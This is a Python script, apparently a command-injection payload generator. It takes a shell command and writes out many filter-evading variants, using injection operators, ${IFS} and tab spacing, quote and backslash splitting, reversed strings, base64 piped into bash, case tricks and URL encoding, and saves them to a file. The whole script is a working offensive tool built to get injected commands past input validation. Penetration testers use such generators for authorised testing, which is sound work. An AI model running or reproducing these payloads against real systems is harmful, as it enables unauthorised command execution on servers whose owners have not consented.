import sys
from urllib import parse
import base64
import re

operators = ["", "%3b", "%0a", "%26", "%7c", "%26%26", "-azertyuiopmlkjhgfdsqwxcbn0123456789%7c%7c"]

chars = {
    "/" : "${PATH:0:1}",
    ";" : "${LS_COLORS:10:1}",    
}

spacers = ["${IFS}", "\t"]

bypassers = ["$@", "\\"]

def case_insensitive_translate(cmd):
    chrs = []
    for i in range(0, len(cmd)):
        this_chr = cmd[i]
        if (i % 2 == 0):
            try:
                this_chr = this_chr.upper()
            except:
                ""
        chrs.append(this_chr)
    cmd = "".join(chrs)
    return '$(tr "[A-Z]" "[a-z]"<<<"{}")'.format(cmd)

def case_insensitive_printf(cmd):
    chrs = []
    for i in range(0, len(cmd)):
        this_chr = cmd[i]
        if (i % 2 == 0):
            try:
                this_chr = this_chr.upper()
            except:
                ""
        chrs.append(this_chr)
    cmd = "".join(chrs)
    s = '%s "${a,,}"'
    return '$(a="{}";printf {})'.format(cmd, s)

def spaces_sub_commas(cmd):
    brackets = '{' + cmd.replace(" ", ",") + '}'
    return brackets


def backsticks(cmd):
    return '`{}`'.format(cmd)


def reversed(cmd):
    l = list()
    for chr in cmd:
        l.append(chr)
    l.reverse()
    cmd = "".join(l)
    return "$(rev<<<'{}')".format(cmd)


def subshell(cmd):
    return '$({})'.format(cmd)


def encoded(cmd):
    encoded = base64.b64encode(bytes(cmd, encoding='utf-8')).decode()
    return "bash<<<$(base64 -d<<<{})".format(encoded)


def quotes(cmd):
    this_cmd = cmd
    cmds = re.findall("[a-zA-Z]+", this_cmd)
    for cmd in cmds:
        origin_cmd = cmd
        if (len(cmd) > 1):
            char = "'{}'".format(cmd[1])
            cmd = cmd.replace(cmd[1], char)
            this_cmd = this_cmd.replace(origin_cmd, cmd)
    return this_cmd


def double_quotes(cmd):
    this_cmd = cmd
    cmds = re.findall("[a-zA-Z]+", this_cmd)
    for cmd in cmds:
        origin_cmd = cmd
        if (len(cmd) > 1):
            char = '"{}"'.format(cmd[1])
            cmd = cmd.replace(cmd[1], char)
            this_cmd = this_cmd.replace(origin_cmd, cmd)
    return this_cmd


def bypasser_chars(cmd, bypasser):
    changed = list()
    for chrs in cmd:
        changed.append(chrs)
    return "{}".format(bypasser).join(changed)


def replace_keys(payload):
    for key in chars.keys():
        payload = payload.replace(key, chars[key])
    return payload


def generate_payloads(cmd):
    payloads =list()

    cmd = cmd.strip()
    original_cmd = cmd

    for operator in operators:   
        cmd = original_cmd   
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = quotes(cmd)
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = double_quotes(cmd)
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = backsticks(cmd)
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = case_insensitive_printf(cmd)
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = case_insensitive_translate(cmd)
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = spaces_sub_commas(cmd)
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = subshell(cmd)
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = reversed(cmd)
        append_payloads(cmd, payloads, operator)

        cmd = original_cmd
        cmd = encoded(cmd)
        append_payloads(cmd, payloads, operator)

        for bypasser in bypassers:
            cmd = original_cmd            
            cmd = bypasser_chars(cmd, bypasser)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = bypasser_chars(cmd, bypasser)
            cmd = reversed(cmd)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = bypasser_chars(cmd, bypasser)
            cmd = encoded(cmd)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = bypasser_chars(cmd, bypasser)
            cmd = subshell(cmd)
            append_payloads(cmd, payloads, operator)

            for space in spacers:
                cmd = original_cmd            
                cmd = bypasser_chars(cmd, bypasser)
                cmd = cmd.replace(" ", space)
                append_payloads(cmd, payloads, operator)

                cmd = original_cmd
                cmd = bypasser_chars(cmd, bypasser)
                cmd = reversed(cmd)
                cmd = cmd.replace(" ", space)
                append_payloads(cmd, payloads, operator)

                cmd = original_cmd
                cmd = bypasser_chars(cmd, bypasser)
                cmd = encoded(cmd)
                cmd = cmd.replace(" ", space)
                append_payloads(cmd, payloads, operator)

                cmd = original_cmd
                cmd = bypasser_chars(cmd, bypasser)
                cmd = subshell(cmd)
                cmd = cmd.replace(" ", space)
                append_payloads(cmd, payloads, operator)

        for space in spacers:
            cmd = original_cmd
            cmd = quotes(cmd)
            cmd = cmd.replace(" ", space)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = case_insensitive_printf(cmd)
            cmd = cmd.replace(" ", space)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = case_insensitive_translate(cmd)
            cmd = cmd.replace(" ", space)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = cmd.replace(" ", space)
            cmd = encoded(cmd)
            cmd = cmd.replace(" ", space)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = encoded(cmd)
            cmd = cmd.replace(" ", space)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = cmd.replace(" ", space)
            cmd = subshell(cmd)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = cmd.replace(" ", space)
            cmd = backsticks(cmd)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = cmd.replace(" ", space)
            cmd = case_insensitive_printf(cmd)
            cmd = cmd.replace(" ", space)
            append_payloads(cmd, payloads, operator)

            cmd = original_cmd
            cmd = cmd.replace(" ", space)
            cmd = case_insensitive_translate(cmd)
            cmd = cmd.replace(" ", space)
            append_payloads(cmd, payloads, operator)

    payloads = list(set(payloads))

    while None in payloads:
        payloads.remove(None)
    data = "\n".join(payloads)

    print("[+] Saving payloads payloads.")

    with open("payloads", "wt") as f:
        f.write(data)
        f.close()
    
    print(data)
    print("[+] List of {} payloads created.".format(len(payloads)))

def append_payloads(cmd, payloads, operator):
    payloads.append(replace_keys("{}{}".format(operator, cmd)))
    payloads.append("{}{}".format(operator, cmd))
    payloads.append("{}{}".format(operator, parse.quote_plus(cmd)))
    payloads.append("{}{}".format(operator, parse.quote(cmd)))
    


def main():
    if (len(sys.argv) < 2):
        print("[!] Usage: {} 'cmd to inject'".format(sys.argv[0]))
        exit()

    cmd = sys.argv[1]
    print("[!] Generating payloads for [{}]".format(cmd))
    generate_payloads(cmd)

main()